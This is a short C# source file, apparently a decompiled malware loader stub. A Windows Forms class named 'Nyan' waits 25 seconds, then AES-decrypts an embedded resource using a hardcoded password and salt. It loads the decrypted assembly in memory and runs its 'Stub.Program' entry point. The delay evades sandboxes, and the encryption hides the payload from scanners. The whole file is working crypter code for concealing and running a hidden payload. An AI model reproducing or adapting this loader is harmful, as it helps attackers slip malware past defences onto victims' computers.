using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Loader;

public class Nyan : Form
{
	public Nyan()
	{
		Initialize();
	}

	public void Initialize()
	{
		Thread.Sleep(25000);
		Assembly assembly = AppDomain.CurrentDomain.Load(AES_Decrypt(GetResource("4prbhrdgswu")));
		Type type = assembly.GetType("Stub.Program");
		dynamic val = Activator.CreateInstance(type);
		val.Run();
	}

	private static byte[] AES_Decrypt(byte[] bytesToBeDecrypted)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		byte[] bytes = Encoding.UTF8.GetBytes("nskpidgnedk");
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	private static byte[] GetResource(string file)
	{
		ResourceManager resourceManager = new ResourceManager("o0jm2wgcfij", Assembly.GetExecutingAssembly());
		return (byte[])resourceManager.GetObject(file);
	}
}
